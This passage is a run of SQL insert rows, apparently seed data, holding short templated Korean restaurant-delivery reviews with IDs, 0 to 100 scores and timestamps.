	(127, '서비스 태도도 좋았고, 음식도 맛있었어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(128, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(129, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 11, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(130, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(131, '음식이 매우 짜서 입맛에 맞지 않았습니다.', 13, 22, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(132, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(133, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(134, '주문한 음식이 완전히 다른 것이 왔고, 맛도 별로였어요.', 13, 17, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(135, '전혀 맛이 없었습니다. 돈이 아까웠어요.', 14, 20, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(136, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 11, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(137, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(138, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(139, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(140, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 11, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(141, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(142, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(143, '음식이 너무 맛이 없었습니다. 정말 실망했어요.', 10, 11, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(144, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(145, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 15, 16, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(146, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 14, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(147, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 15, 17, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(148, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(149, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 10, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(150, '음식이 너무 맛이 없었습니다. 정말 실망했어요.', 13, 12, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(151, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(152, '음식은 평범했고, 특별한 매력을 찾기 어려웠어요. 다음 번에는 다른 가게를 시도해볼 생각입니다.', 15, 18, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(153, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 11, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(154, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(155, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(156, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 11, 19, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(157, '주문한 음식이 완전히 다른 것이 왔고, 맛도 별로였어요.', 11, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(158, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(159, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 13, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(160, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(161, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(162, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(163, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(164, '서비스 태도도 좋았고, 음식도 맛있었어요.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(165, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(166, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(167, '음식의 양도 적었고, 맛도 별로였어요.', 14, 20, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(168, '음식은 그럭저럭 괜찮았지만, 기대한 만큼의 만족은 얻지 못했어요.', 13, 14, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(169, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(170, '음식은 그럭저럭 괜찮았지만, 기대한 만큼의 만족은 얻지 못했어요.', 10, 22, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(171, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(172, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 15, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(173, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(174, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(175, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 13, 18, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(176, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(177, '서비스 태도도 좋았고, 음식도 맛있었어요.', 11, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(178, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 12, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(179, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(180, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 12, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(181, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(182, '음식의 퀄리티가 형편없었고, 서비스도 최악이었습니다.', 13, 18, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(183, '서비스는 별로였고, 음식의 퀄리티도 아쉬웠어요. 다른 곳에서 시도해볼 만한 가치는 없었습니다.', 13, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(184, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 11, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(185, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 15, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(186, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(187, '음식의 퀄리티가 형편없었고, 서비스도 최악이었습니다.', 13, 19, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(188, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(189, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(190, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(191, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 12, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(192, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(193, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 15, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(194, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 12, 17, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(195, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(196, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 12, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(197, '음식이 맛있었고, 서비스도 만족스러웠어요.', 13, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(198, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(199, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 12, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(200, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 13, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(201, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(202, '음식의 양도 적었고, 맛도 별로였어요.', 12, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(203, '음식의 양도 적었고, 맛도 별로였어요.', 10, 22, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(204, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(205, '음식의 양도 적었고, 맛도 별로였어요.', 13, 20, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(206, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(207, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 13, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(208, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 14, 16, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(209, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(210, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 12, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(211, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(212, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(213, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(214, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(215, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(216, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(217, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(218, '주문한 음식이 전혀 맞지 않았고, 맛도 없었어요.', 11, 22, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(219, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(220, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(221, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 13, 12, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(222, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(223, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 12, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(224, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 14, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(225, '음식이 맛있었고, 서비스도 만족스러웠어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(226, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(227, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 11, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(228, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(229, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(230, '음식이 맛있었고, 서비스도 만족스러웠어요.', 12, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(231, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(232, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(233, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(234, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(235, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 11, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(236, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(237, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(238, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 13, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(239, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 11, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(240, '음식이 너무 맛이 없었습니다. 정말 실망했어요.', 11, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(241, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(242, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 14, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(243, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(244, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(245, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 11, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(246, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(247, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(248, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(249, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 15, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(250, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(251, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 11, 20, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(252, '음식의 맛과 양 모두 만족스러웠습니다.', 13, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(253, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 12, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(254, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 10, 14, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(255, '음식의 맛과 가격이 모두 만족스러웠습니다.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(256, '전혀 맛이 없었습니다. 돈이 아까웠어요.', 15, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(257, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 11, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(258, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 11, 18, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(259, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 10, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(260, '주문한 음식이 맛이 없었고, 배달이 매우 느렸어요.', 12, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(261, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(262, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(263, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(264, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 12, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(265, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(266, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 10, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(267, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(268, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(269, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(270, '음식이 싱겁고, 퀄리티도 많이 떨어졌어요.', 12, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(271, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(272, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 11, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(273, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 11, 17, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(274, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 15, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(275, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(276, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 11, 13, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(277, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(278, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 15, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(279, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 10, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(280, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 13, 17, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(281, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(282, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(283, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(284, '주문한 음식이 늦게 도착했고, 맛도 별로였어요.', 15, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(285, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(286, '최악의 경험. 주문한 음식이 완전히 망가졌어요.', 11, 11, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(287, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(288, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 12, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(289, '서비스는 별로였고, 음식의 퀄리티도 아쉬웠어요. 다른 곳에서 시도해볼 만한 가치는 없었습니다.', 13, 17, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(290, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 12, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(291, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(292, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(293, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 12, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(294, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(295, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(296, '음식의 맛과 양 모두 만족스러웠습니다.', 13, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(297, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(298, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(299, '음식이 맛있었고, 서비스도 만족스러웠어요.', 13, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(300, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 11, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(301, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 13, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(302, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 10, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(303, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
